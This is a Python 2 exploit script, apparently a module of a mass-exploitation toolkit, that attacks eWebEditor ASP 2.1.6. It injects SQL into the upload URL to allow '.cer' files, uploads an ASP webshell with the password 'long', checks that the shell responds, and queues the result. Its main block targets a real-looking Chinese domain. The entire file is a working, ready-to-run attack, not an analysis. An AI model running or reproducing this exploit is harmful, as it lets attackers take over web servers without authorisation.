#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#ewebeditor asp版 2.1.6 上传漏洞
import threading
import requests  #上传
import re
import sys
sys.path.append('..')
import Class_Queue
import yijuhua_CS

class ewebeditor_Upload(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #线程ID
        self.ewebeditor_asp("http://"+url)  #

    def ewebeditor_asp(self,arg):  #
        try:
            url=arg+"/jms/edit/Upload.asp?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a"
            files = {'uploadfile': open("long.asp.cer","rb")}
            r = requests.post(url, files=files)
            data=r.text
            #print data
            p = re.compile(r"parent.UploadSaved\('(.*?)'\)")
            sarr = p.findall(data)#找出一条
            name=sarr[0]
            #print name
            url="%s/jms/edit/uploadfile/%s"%(arg,name)
            if yijuhua_CS.yijuhua_cs("asp",url,"long"):   #ASP还是PHP  ,URL地址 ，密码
                #print url+"OK"
                EXP_list=[1,self.url,"exp","exp_ewebeditor_Upload_asp",url,"long","webshell"]
                #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
            else:
                #print url+"NO"
                EXP_list=[0,self.url,"exp","exp_ewebeditor_Upload_asp",url,"long","webshell"]
                #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列


        except Exception,e:
            #print e
            return 0



################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        threads.append(ewebeditor_Upload("www.fpimc.cn"))

    for t in threads:
        t.start()

